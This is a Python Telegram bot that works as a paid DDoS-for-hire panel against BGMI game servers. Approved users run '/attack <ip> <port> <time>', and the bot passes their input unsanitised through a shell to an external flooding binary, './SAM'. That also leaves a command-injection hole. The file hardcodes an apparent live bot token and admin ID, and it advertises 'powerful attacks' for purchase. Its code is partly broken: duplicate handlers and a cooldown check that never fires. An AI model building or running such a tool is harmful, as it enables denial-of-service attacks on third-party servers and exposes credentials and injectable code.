#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import time
from datetime import timedelta
from threading import Timer
import pytz

# Insert your Telegram bot token here
bot = telebot.TeleBot('7204011579:AAHWcguGQegCPKZyxQ3z5k8WxGH2Tx14sfY')

# Admin user IDs
admin_id = ["2062628281"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store allowed user access
USER_ACCESS_FILE = "users_access.txt"

# IST timezone
ist = pytz.timezone('Asia/Kolkata')

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read user access data from the file
def read_user_access():
    user_access_data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                user_id, expiry_time = line.split(":")
                user_access_data[user_id] = {"expiry_time": float(expiry_time)}
    except FileNotFoundError:
        pass
    return user_access_data

# List to store allowed user IDs
allowed_user_ids = read_users()

# Define a dictionary to store user access data
user_access = read_user_access()

# Function to save user access data
def save_user_access(data):
    with open(USER_ACCESS_FILE, "w") as file:
        for user_id, access_info in data.items():
            file.write(f"{user_id}:{access_info['expiry_time']}\n")

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to remove expired users
def remove_expired_users():
    current_time = datetime.datetime.now().timestamp()
    users_to_remove = [user_id for user_id, access_info in user_access.items() if access_info["expiry_time"] <= current_time]
    for user_id in users_to_remove:
        if user_id in allowed_user_ids:
            allowed_user_ids.remove(user_id)
        del user_access[user_id]

    # Save updated user lists
    with open(USER_FILE, "w") as file:
        for user_id in allowed_user_ids:
            file.write(f"{user_id}\n")
    
    save_user_access(user_access)

    # Schedule the next check
    Timer(60, remove_expired_users).start()  # Check every minute

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only @dedicating_gaming Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['owner'])
def show_owner(message):
    response = "👑 Bot Owner: @dedicating_gaming"  # Replace with the actual owner username
    bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:  # Check if the command contains the user ID and time duration
            user_to_add = command[1]
            try:
                # Extract the time value and unit
                time_value = int(command[2])
                time_unit = command[3] if len(command) > 3 else 'days'

                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                    
                    # Get current time in IST
                    current_time = datetime.datetime.now(ist)
                    
                    # Calculate the expiry time based on the time unit
                    if time_unit == 'minutes':
                        expiry_time = current_time + timedelta(minutes=time_value)
                    elif time_unit == 'hours':
                        expiry_time = current_time + timedelta(hours=time_value)
                    elif time_unit == 'days':
                        expiry_time = current_time + timedelta(days=time_value)
                    elif time_unit == 'months':
                        expiry_time = current_time + timedelta(days=time_value * 30)  # Approximate 1 month = 30 days
                    else:
                        response = "Invalid time unit. Please use 'minutes', 'hours', 'days', or 'months'."
                        bot.reply_to(message, response)
                        return
                    
                    # Convert expiry time to timestamp
                    expiry_timestamp = expiry_time.timestamp()

                    # Update user access
                    user_access[user_to_add] = {"expiry_time": expiry_timestamp}
                    # Save user access data
                    save_user_access(user_access)
                    response = f"User {user_to_add} approved for {time_value} {time_unit} by @dedicating_gaming.\n\n\n 🅑🅞🅣 🅛🅘🅝🅚: @dedicating_bot"
                else:
                    response = "User already exists."
            except ValueError:
                response = "Invalid time value. Please specify a valid number."
        else:
            response = "Please specify a user ID followed by a positive integer with minute(s), hour(s), day(s), or month(s). \n\nExample Usage: /add 9999999999 3 hours('minutes', 'hours', 'days', or 'months')"
    else:
        response = "Only @dedicating_gaming can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "Only @dedicating_gaming can run this command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                del user_access[user_to_remove]
                
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                
                save_user_access(user_access)
                response = f"User {user_to_remove} has been removed."
            else:
                response = "User not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "Only @dedicating_gaming can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_info(message):
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "No username"
    role = "User"  # Assuming role is User, adjust if you have role information
    
    # Check if the user is in allowed_user_ids and user_access
    if user_id in allowed_user_ids and user_id in user_access:
        expiry_timestamp = user_access[user_id]["expiry_time"]
        expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Expiry Date: {expiry_date}\n"
                    )
    else:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⚠️ Expiry Date: Not available\n"
                    )
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🚀 Attack  Started Succesfully! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time} seconds"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown . Please Wait 1min Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 600 :
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./SAM {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f" 🚀 Attack  Finished! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time} seconds"
        else:
            response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\n"
                    "Oops! it seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks,\n\n"
                    "👉 Contact an Admin or the Owner @dedicating_gaming for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n"
                    "💬 Chat with an Owner @dedicating_gaming now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:\n
- /attack : Method for BGMI servers.\n
- /status : Check wheather bot is active?\n
- /plan : Check your plan expiry date.\n
- /rules : Please check before use.\n
- /mylogs : To check your recent attacks.\n
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = (
        f"🥀Welcome {user_name}!\n\n"
        " For User ID : /id \n\n"
        "👉 Join our official channel - @dedicating_gaming ✅\n\n"
        "👑 For access: @dedicating_gaming"
        "👑 OWNER : @dedicating_gaming"
    )
    bot.reply_to(message, response)

import datetime

@bot.message_handler(commands=['plan'])
def show_access_expiry(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if user_id in user_access:
            expiry_timestamp = user_access[user_id]["expiry_time"]
            expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
            response = f"Hello! Your access expires on: {expiry_date}"
        else:
            response = "Hello! Your access expiry information is not available."
    else:
        response = (
            "🚫 Unauthorized Access! 🚫\n\n"
            "Oops! It seems like you don't have permission to use the /plan command.\n"
            "To gain access and unleash the power of attacks,\n\n"
            "👉 Contact an Admin or the Owner @dedicating_gaming for approval.\n"
            "🌟 Become a proud supporter and purchase approval.\n"
            "💬 Chat with an Owner @dedicating_gaming now and level up your capabilities!\n\n"
            "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
        )
    
    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['owner'])
def show_owner(message):
    response = "👑 Bot Owner: @dedicating_gaming"  # Replace with the actual owner username
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = (
        f"{user_name}, admin commands are here:\n\n"
        "- /add <userId> : Add a user.\n"
        "- /remove <userId> : Remove a user.\n"
        "- /allusers : Authorized users list.\n"
        "- /broadcast : Broadcast a message.\n"
        "- /logs : History of all logs by users.\n"    
)
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = (
        f"{user_name}, Please follow these rules:\n\n"
        "1. Attack starts from commands /attack <ip> <port> <time> no need of threads.\n"
        "2. Don't run 2 attacks at the same time, as it will result in a ban from the bot.\n"
        "3. In-game freeze also supported.\n"
        "4. Click on /plan from menu to check expiry details.\n"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_handler(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "Only @dedicating_gaming can run this command.")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! it seems like you don't have permission to use the /mylogs command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @Vaibhav_dhami for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @Vaibhav_dhami now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "❌❌ ATTENTION EVERYONE ❌❌\n MEESSAGE FROM @dedicating_gaming:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
    else:
        response = "Only @dedicating_gaming can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def bot_status(message):
    bot.reply_to(message, "Bot is active and running 24 x 7.")

# Remove expired users from allowed_user_ids at startup
def remove_expired_users():
    current_time = time.time()
    for user_id, access_info in list(user_access.items()):
        if current_time > access_info["expiry_time"]:
            if user_id in allowed_user_ids:
                allowed_user_ids.remove(user_id)
            del user_access[user_id]
    # Save updated user access data
    save_user_access(user_access)

if __name__ == "__main__":
    # Load user access data
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            for line in file:
                user_id, expiry_time = line.strip().split(":")
                user_access[user_id] = {"expiry_time": float(expiry_time)}
    except FileNotFoundError:
        pass

    # Remove expired users
    remove_expired_users()

   # Start the timer to remove expired users
Timer(60, remove_expired_users).start()  # Check every minute

# Start the bot
bot.polling()
